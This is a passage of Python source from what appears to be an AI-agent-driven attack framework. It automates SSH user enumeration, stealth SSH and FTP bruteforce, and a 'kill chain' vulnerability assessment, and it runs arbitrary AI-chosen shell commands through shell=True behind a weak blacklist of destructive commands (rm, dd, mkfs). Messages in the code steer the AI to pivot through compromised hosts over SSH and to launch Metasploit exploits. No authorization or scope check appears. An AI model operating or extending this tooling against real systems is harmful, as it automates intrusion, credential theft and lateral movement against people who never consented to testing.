                    print(f"    [*] Scrapling: {scrape_url}")

                # v5.0: nikto only on primary port 80 — running 3+ instances
                # was blocking the agent for 15+ minutes with timeouts
                # Non-standard ports are covered by scrapling + nmap scripts
            else:
                print("\n  [*] No web ports open — skipping wpscan, sqlmap, nikto")

            if has_ssh:
                print("  [*] SSH detected — running user enumeration first...")
                phase1_futures[executor.submit(run_ssh_user_enum, target)] = "ssh_user_enum"

            if has_ftp:
                print("  [*] FTP detected — running bruteforce...")
                phase1_futures[executor.submit(run_bruteforce, "ftp", target)] = "ftp_bruteforce"

            if not phase1_futures:
                print("  [*] No exploitable services found for extended tools.")

            for future in concurrent.futures.as_completed(phase1_futures):
                tool_name = phase1_futures[future]
                try:
                    result = future.result()
                    results[tool_name] = result
                    if tool_name == "ssh_user_enum":
                        result_str = str(result)
                        if "UNRELIABLE" in result_str:
                            print(f"  [!] SSH user enum results UNRELIABLE (server patched) — using defaults")
                        elif "VALID USER" in result_str:
                            import re as _re
                            for m in _re.finditer(r'[✓]\s+(\S+)', result_str):
                                enum_users.append(m.group(1))
                            print(f"  [+] SSH enum found {len(enum_users)} valid users: {enum_users}")
                except Exception as exc:
                    results[tool_name] = f"[!] {tool_name} error: {exc}"

        # ── PHASE 2: SSH bruteforce with discovered users ──
        if has_ssh:
            print(f"\n  [*] Phase 2: SSH bruteforce with {len(enum_users) if enum_users else 'default'} users...")
            try:
                results["ssh_bruteforce"] = run_bruteforce("ssh", target, extra_users=enum_users or None)
            except Exception as exc:
                results["ssh_bruteforce"] = f"[!] ssh_bruteforce error: {exc}"

        # ── PHASE 3 (v4.0): Vulnerability Assessment ──
        print(f"\n  [*] Phase 3: Kill chain vulnerability assessment...")
        try:
            from killchain import vuln_assess
            recon_blob = format_recon_for_llm(results)
            results["vuln_assess"] = vuln_assess(target, recon_blob)
        except ImportError:
            results["vuln_assess"] = "[!] killchain.py not found — skipping vuln assessment"
        except Exception as exc:
            results["vuln_assess"] = f"[!] vuln_assess error: {exc}"

        return format_recon_for_llm(results)

    combined = {}
    for key in choice.split():
        if key in TOOLS_MENU:
            name, func = TOOLS_MENU[key]
            print(f"\n[*] Running {name}...")
            combined[name] = func(target)
        else:
            print(f"[!] Unknown option: {key}")

    return format_recon_for_llm(combined)


# ─────────────────────────────────────────────
# ARBITRARY COMMAND RUNNER (ENHANCED v3.0)
# ─────────────────────────────────────────────

def run_arbitrary_cmd(cmd_str: str) -> str:
    """
    Allows AI to run generic bash commands, with smart timeouts and safety checks.
    Uses shell=True to support pipes and complex arguments.
    v3.0: Smart timeout per command type.
    """
    parts = cmd_str.strip().split()
    if not parts:
        return "[!] Empty command."

    # strict blacklist
    blacklist = ["rm", "dd", "mkfs", "shutdown", "reboot", "poweroff", "init", "mv"]
    if parts[0] in blacklist or any(b in f" {cmd_str} " for b in [" rm ", " dd ", " mkfs "]):
        return f"[!] Command blocked for safety: {cmd_str}"

    # v5.0: Block external commands targeting internal IPs
    # AI sometimes runs enum4linux/nmap against internal IPs discovered inside a target
    _EXTERNAL_NETWORK_TOOLS = {"enum4linux", "nmap", "nikto", "hydra", "smbclient",
                                "curl", "wget", "sqlmap", "wpscan", "masscan", "gobuster"}
    if parts[0].lower() in _EXTERNAL_NETWORK_TOOLS and len(parts) >= 2:
        for arg in parts[1:]:
            clean_ip = arg.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
            if _is_internal_ip(clean_ip):
                print(f"  {C_RED}[!] BLOCKED: {clean_ip} is internal — cannot reach from outside{C_RESET}")
                return (
                    f"[!] BLOCKED: {clean_ip} is a private/internal IP. "
                    f"You CANNOT run {parts[0]} against it from outside.\n"
                    f"AI: Route through SSH! Use:\n"
                    f"  [TOOL: ssh_exec COMPROMISED_HOST USER PASS '{cmd_str}']\n"
                    f"This will run the command INSIDE the compromised target where internal IPs are reachable."
                )

    # Smart timeout based on command type
    tool = parts[0].lower()
    timeout_map = {
        "telnet":     10,   # Was 300! Telnet should be quick banner grab only
        "ssh":        15,   # SSH connection test
        "ftp":        15,   # FTP anonymous test
        "nc":         10,   # Netcat — dangerous for hanging
        "netcat":     10,
        "ping":       15,   # Quick ping test
        "curl":       30,   # HTTP request
        "wget":       30,
        "hydra":      300,  # Bruteforce needs time
        "nmap":       300,  # Scanning needs time
        "masscan":    120,  # Fast scanner
        "nikto":      300,
        "sqlmap":     300,
        "wpscan":     180,
        "gobuster":   120,
        "ffuf":       120,
        "enum4linux": 150,
        "smbclient":  45,
        "msfconsole": 300,
        "searchsploit": 30,
        "jmx2rce":    60,   # Tomcat JMX exploit
        "nuclei":     180,  # Template scanner
        "nxc":        60,   # NetExec/CrackMapExec
        "crackmapexec": 60,
    }
    timeout = timeout_map.get(tool, 120)

    # Prevent interactive commands from hanging the agent
    if tool == "ssh" and "-o BatchMode=yes" not in cmd_str:
        cmd_str = cmd_str.replace("ssh ", "ssh -o BatchMode=yes -o StrictHostKeyChecking=no ", 1)
    elif tool == "ftp":
        # Wrap ftp in a timeout wrapper since ftp itself is interactive
        cmd_str = f"echo 'quit' | timeout {timeout} {cmd_str}"
    elif tool == "telnet":
        # Wrap telnet with timeout — it doesn't have its own
        cmd_str = f"timeout {timeout} {cmd_str}"
    elif tool == "msfconsole":
        # v7.0: Block direct msfconsole calls — they bypass our module correction map
        # AI should use [MSF:] tag instead
        return (
            "[!] DO NOT call msfconsole directly via [CMD:].\n"
            "Use [MSF: module_path | RHOSTS=IP] instead — it validates modules and prevents hangs.\n"
            "AI: Reformat your request as [MSF: exploit/path | RHOSTS=IP RPORT=PORT]"
        )
    elif tool == "hydra":
        # v7.0: Block hydra — use [TOOL: bruteforce service IP] instead
        return (
            "[!] DO NOT call hydra directly.\n"
            "Use [TOOL: bruteforce ssh IP] or [TOOL: bruteforce ftp IP] instead.\n"
            "The built-in bruteforce uses stealth paramiko transport reuse."
        )

    print(f"  [*] Executing generic CMD: {cmd_str}")

    import time, threading

    lines = []
    start_time = time.time()
    _exit_code = -1

    # Dynamic heartbeat (same logic as run_tool)
    if timeout > 300:
        heartbeat_interval = 60
    else:
        heartbeat_interval = 30

    try:
        proc = subprocess.Popen(
            cmd_str, shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        def _read():
            for line in proc.stdout:
                line = line.rstrip('\n')
                lines.append(line)
                # Show important lines live
                if any(kw in line.lower() for kw in [
                    "host:", "login:", "password", "found", "valid",
                    "[ssh]", "[22]", "[80]", "success", "open",
                    "vuln", "error", "complete", "[+]", "session"
                ]):
                    elapsed = int(time.time() - start_time)
                    print(f"      [{elapsed}s] {line[:140]}")

        reader = threading.Thread(target=_read, daemon=True)
        reader.start()

        while reader.is_alive():
            reader.join(timeout=heartbeat_interval)
            elapsed = int(time.time() - start_time)
            if elapsed > timeout:
                proc.kill()
                proc.wait()
                lines.append(f"[!] Timed out after {timeout}s")
                print(f"      [TIMEOUT] {tool} killed after {_fmt_elapsed(timeout)}")
                break
            if reader.is_alive():
                print(f"      [♻ {tool} running... {_fmt_elapsed(elapsed)} / {_fmt_elapsed(timeout)} max]")

        proc.wait(timeout=5)
        _exit_code = proc.returncode or 0

    except Exception as e:
        _duration = time.time() - start_time
        return ToolResult(
            tool_name=tool, command=cmd_str, stdout=f"[!] Command failed: {e}",
            stderr=str(e), exit_code=-1, duration=_duration)

    output = "\n".join(lines)
    _duration = time.time() - start_time

    if not output.strip():
        return ToolResult(
            tool_name=tool, command=cmd_str, stdout="[!] Command returned no output.",
            exit_code=_exit_code, duration=_duration)

    # Truncate for AI context
    if len(lines) > 200:
        output = f"[... truncated {len(lines) - 200} lines ...]\n" + "\n".join(lines[-200:])

    return ToolResult(
        tool_name=tool, command=cmd_str, stdout=output,
        exit_code=_exit_code, duration=_duration)


# ─────────────────────────────────────────────
# QUICK TEST
# ─────────────────────────────────────────────

if __name__ == "__main__":
    target = input("Enter test target (IP or domain): ").strip()
    results = run_default_recon(target)
    print(format_recon_for_llm(results))
